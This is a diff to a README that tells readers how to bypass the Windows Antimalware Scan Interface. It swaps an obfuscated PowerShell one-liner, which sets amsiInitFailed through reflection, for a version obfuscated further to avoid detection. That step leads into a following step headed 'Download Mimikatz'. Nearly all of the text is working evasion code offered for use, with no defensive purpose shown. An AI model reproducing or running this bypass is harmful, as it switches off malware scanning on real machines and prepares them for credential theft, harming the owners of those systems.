@@ -11,7 +11,7 @@ This repository provides a method to bypass the **Windows Antimalware Scan Inter
 Run the following command in **PowerShell** to bypass AMSI:
 
 ```powershell
-$a='si';$b='Am';$Ref=[Ref].Assembly.GetType("System.Management.Automation.${b}${a}Utils");$z=$Ref.GetField("am${a}InitFailed",'NonPublic,Static');$z.SetValue($null,$true)
+$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)
 ```
 ### **Step 2: Download Mimikatz**
 
